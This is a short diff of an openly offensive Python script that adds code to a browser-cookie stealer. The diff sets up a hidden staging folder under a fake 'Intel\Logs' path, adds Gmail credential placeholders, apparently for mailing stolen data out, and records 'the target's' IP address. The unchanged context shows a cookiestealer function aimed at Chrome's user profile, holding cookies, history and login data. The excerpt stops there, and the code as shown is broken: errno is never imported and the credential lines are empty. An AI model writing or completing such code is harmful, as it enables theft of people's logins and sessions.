@@ -1,15 +1,26 @@
 import os
 import shutil
+import socket
 import getpass
+import datetime,time
 
 currentdir = os.getcwd()
 curentuser = getpass.getuser()
+
+path_to_cookies = "C:\Users\Public\Intel\Logs"
+passkey =  # Your Gmail password. Make sure to encode it.
+userkey =  # Your Gmail username. Make sure to encode it.
 
 try:
 	os.makedirs(path_to_cookies) #Copying the cookies, history and login data file to a secure location
 except OSError as exception:
 	if exception.errno != errno.EEXIST:
 		raise
+
+try:
+	ip_address = socket.gethostbyname(socket.gethostname()) #getting the ip address of the target
+except:
+	pass
 
 def cookiestealer():
 	cookiepath = 'C://Users//' + curentuser + '//AppData//Local//Google//Chrome//User Data//Default//'
